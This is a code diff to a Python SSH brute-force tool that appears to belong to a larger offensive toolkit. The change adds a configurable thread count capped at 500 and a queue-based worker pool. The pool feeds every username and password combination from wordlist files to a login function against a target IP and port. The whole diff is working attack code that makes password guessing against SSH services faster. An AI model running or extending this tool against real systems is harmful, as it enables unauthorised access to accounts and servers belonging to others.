@@ -5,6 +5,8 @@ import time
 import argparse
 import logging
 import threading
+import queue
+import readline
 from utilities import *
 
 
@@ -22,11 +24,12 @@ def ssh_bruteforce():
         sys.argv += arguments.split()
 
         try:
-            parser = argparse.ArgumentParser(exit_on_error=False, usage="-t TARGET -p PORT -u USERNAMES -w PASSWORDS")
+            parser = argparse.ArgumentParser(exit_on_error=False, usage="-t TARGET -p PORT -u USERNAMES -w PASSWORDS [-T] THREADS")
             parser.add_argument("-t", "--target", help="Target IP address", required=True)
             parser.add_argument("-p", "--port", help="Target port", required=True)
             parser.add_argument("-u", "--usernames", help="Usernames file", required=True)
             parser.add_argument("-w", "--passwords", help="Passwords file", required=True)
+            parser.add_argument("-T", "--threads",type=int, help="Number of threads", required=False)
             args = parser.parse_args()
         except argparse.ArgumentTypeError as e:
             print(e)
@@ -43,13 +46,20 @@ def ssh_bruteforce():
             args.passwords = os.path.abspath(args.passwords)
             with open(args.usernames) as f:
                 usernames = f.read().splitlines()
-            ssh_bruteforce()
-            with open(args.passwords) as f:
+            with open(args.passwords, errors='ignore') as f:
                 passwords = f.read().splitlines()
 
         except Exception as e:
-            #print("the specified usernames/passwords file doesn't exist")
             print(e)
+            return True
+
+        if (args.threads == None):
+            args.threads = 1
+        try:
+            if(args.threads > 500):
+                raise Exception
+        except:
+            print("The number of threads can't exceed 500")
             return True
 
         def try_login(username, password):
@@ -66,9 +76,25 @@ def ssh_bruteforce():
                 print("An error has occured : ", e)
                 pass
 
+        def worker(q):
+            while True:
+                try:
+                    username, password = q.get(block=False)
+                except queue.Empty:
+                    break
+                try_login(username, password)
+                q.task_done()
+
+        q = queue.Queue()
         for username in usernames:
             for password in passwords:
-                t = threading.Thread(target=try_login, args=(username, password))
-                t.start()
+                q.put((username, password))
+
+        num_threads = args.threads
+        threads = [threading.Thread(target=worker, args=(q,)) for _ in range(num_threads)]
+        for t in threads:
+            t.start()
+
+        q.join()
 
     return True
